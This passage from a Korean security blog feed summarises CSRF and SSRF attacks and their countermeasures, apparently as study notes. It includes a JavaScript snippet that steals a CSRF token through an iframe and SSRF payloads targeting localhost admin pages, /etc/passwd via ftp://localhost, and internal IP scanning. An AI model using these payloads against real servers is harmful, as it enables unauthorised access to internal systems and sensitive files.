  <li>서버에서 랜덤한 CSRF Token을 만들고 세션에 저장한다.</li>
  <li>중요한 요청 페이지에 CSRF Token을 넣어준다.</li>
  <li>공격자는 CSRF Token을 마음대로 만들 수 없다.</li>
  <li>하지만 동일한 도메인에 XSS 취약점이 존재하면 CSRF Token 우회가 가능하다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"csrf 토큰이 들어있는 페이지"</span> <span class="na">onload=</span><span class="s">"load()"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">load</span><span class="p">(){</span>
	<span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">csrf_token</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h3 id="csrf-대응방안">CSRF 대응방안</h3>
<ul>
  <li>지키고자하는 요청에서 <strong>인증정보 추가</strong>하기. (예: 옛날 비밀번호 한번더 입력 , 문자 인증 번호 등 … )</li>
  <li>애매한 요청 (예: 게시판) 일 때는 Referer Check, CSRF Token을 추가하기.</li>
</ul>

<h2 id="ssrf-공격">SSRF 공격</h2>
<h3 id="설명-1">설명</h3>
<ul>
  <li>Server Side Request Forgery</li>
  <li>서버가 임이의 요청을 보내게하는 공격이다.</li>
  <li>많은 API를 사용함으로써 공격하기 더욱 쉬워졌다.</li>
</ul>

<h3 id="발생-위치-1">발생 위치</h3>
<ul>
  <li>파라미터로 URL을 받는 경우.</li>
  <li>서버가 외부 자원(리소스)를 이용하는 곳.</li>
  <li>예 : <code class="language-plaintext highlighter-rouge">view.php?weatherAPI=https://kakao.com/~~~</code></li>
</ul>

<h3 id="서버에서-url-동작-방식">서버에서 URL 동작 방식</h3>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IEFQSeyjvOyGjOqwgCDri7TquLQg7Y6Y7J207KeAIOyalOyyrVxu7ISc67KEIC0-PiBBUEkg7ISc67KEIDog642w7J207YSwIOyalOyyrVxuQVBJIOyEnOuyhCAtPj4g7ISc67KEIDog642w7J207YSwIOydkeuLtVxu7ISc67KEIC0-PiDshJzrsoQgOiDtjpjsnbTsp4Ag66CM642U66eBXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
<ol>
  <li>서버가 사용자가 보낸 요청으로 API주소를 받는다.</li>
  <li>서버에서 주소로 요청한다. 즉 데이터를 가지고 온다.</li>
  <li>서버에서 가지고온 데이터를 가지고 페이지를 만들어 사용자에서 응답한다.</li>
</ol>

<h3 id="공격-유형">공격 유형</h3>
<h4 id="서버-내부-접속하기">서버 내부 접속하기</h4>
<ul>
  <li>admin 페이지 접근을 목적으로 한다.</li>
  <li>파라미터로 <code class="language-plaintext highlighter-rouge">http://localhost</code> admin 페이지 접속 가능.</li>
  <li>파라미터로 <code class="language-plaintext highlighter-rouge">ftp://localhost/etc/passwd</code> 임의의 파일 열람 가능.</li>
  <li>만약 공격자가 내부 서버의 아이피 주소 유형을 알아냈다면 알아낸 주소를 가지고 포트 스캔이 가능하다.<br /><code class="language-plaintext highlighter-rouge">http://192.168.0.x:80</code> 즉 주소값을 계속 변경하여 내부망에 존재하는 웹 페이지에 접근가능하다.</li>
</ul>

<h3 id="ssrf-대응-방안">SSRF 대응 방안</h3>
<ul>
  <li>파라미터로 URL을 안 받으면 된다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="CSRF" /><category term="SSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 와 SSRF에 대하여 정리하기.]]></summary></entry></feed>